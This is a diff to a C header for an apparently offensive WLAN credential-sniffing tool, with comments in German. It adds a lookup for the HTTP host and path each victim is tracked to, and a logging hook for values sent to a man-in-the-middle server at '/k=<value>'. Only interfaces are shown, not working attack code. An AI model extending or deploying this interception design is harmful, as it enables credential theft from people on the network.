@@ -49,6 +49,21 @@ void wlan_cred_sniff_feed_eth(WlanCredSniff* cs, const uint8_t* eth, uint16_t le
 void wlan_cred_sniff_push_inject(
     WlanCredSniff* cs, uint32_t server_ip, uint32_t victim_ip, uint16_t victim_port);
 
+/** Lookup im Per-Flow-Tracking. host_out/path_out werden mit dem letzten
+ *  bekannten Host bzw. Pfad für (server_ip, victim_port) gefüllt. Liefert
+ *  true wenn Treffer, false wenn nichts in der Map. Bei false sind die
+ *  Out-Buffer unverändert — Caller muss selbst defaulten. */
+bool wlan_cred_sniff_lookup_http_url(
+    WlanCredSniff* cs, uint32_t server_ip, uint16_t victim_port,
+    char* host_out, int host_sz, char* path_out, int path_sz);
+
+/** "LOG"-Eintrag in den Ring legen — wird vom MiTM-HTTP-Server gerufen wenn
+ *  ein eingehender Request auf /k=<value> empfangen wurde. client_ip ist die
+ *  IP des Senders (network byte order). value ist der bereits decodierte
+ *  Payload-String. Darf aus einem anderen Thread (HTTP-Server-Task) gerufen
+ *  werden — cred_push ist MP-safe. */
+void wlan_cred_sniff_push_log(WlanCredSniff* cs, uint32_t client_ip, const char* value);
+
 /** Drain für den UI/Tick-Thread (single consumer). Kopiert bis zu max neue
  *  Einträge seit dem letzten Aufruf (ältester zuerst) nach out; liefert deren
  *  Anzahl. Einträge die zwischenzeitlich überschrieben wurden, werden
